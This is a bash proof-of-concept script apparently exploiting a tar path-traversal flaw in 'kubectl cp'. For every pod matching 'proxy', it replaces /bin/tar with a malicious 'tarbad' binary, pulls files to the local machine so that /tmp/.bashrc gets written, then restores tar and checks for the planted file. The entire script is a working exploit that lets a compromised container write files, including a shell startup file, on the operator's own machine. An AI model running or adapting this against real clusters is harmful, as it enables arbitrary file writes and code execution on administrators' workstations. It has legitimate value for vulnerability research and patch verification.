#!/bin/bash

qq=./kubernetes/_output/local/go/bin/kubectl

python poc.py && tar tvf poc.tar
rm -rf baddir
rm -f /tmp/.bashrc

$qq get po --all-namespaces
$qq get po --all-namespaces | grep proxy | awk '{print $1,$2}' | while read n p; do $qq exec --namespace=$n $p cp /bin/tar /bin/tar.orig; done
$qq get po --all-namespaces | grep proxy | awk '{print $1,$2}' | while read n p; do $qq cp poc.tar $n/$p:/tmp; done
$qq get po --all-namespaces | grep proxy | awk '{print $1,$2}' | while read n p; do $qq cp tarbad $n/$p:/bin/tarbad; done
$qq get po --all-namespaces | grep proxy | awk '{print $1,$2}' | while read n p; do $qq exec --namespace=$n $p chmod 755 /bin/tarbad; done
$qq get po --all-namespaces | grep proxy | awk '{print $1,$2}' | while read n p; do $qq exec --namespace=$n $p chown root:root /bin/tarbad; done
$qq get po --all-namespaces | grep proxy | awk '{print $1,$2}' | while read n p; do $qq exec --namespace=$n $p cp /bin/tarbad /bin/tar; done
$qq get po --all-namespaces | grep proxy | awk '{print $1,$2}' | while read n p; do $qq cp $n/$p:/baddir baddir; done
$qq get po --all-namespaces | grep proxy | awk '{print $1,$2}' | while read n p; do $qq exec --namespace=$n $p cp /bin/tar.orig /bin/tar; done
ls -al /tmp/.bashrc
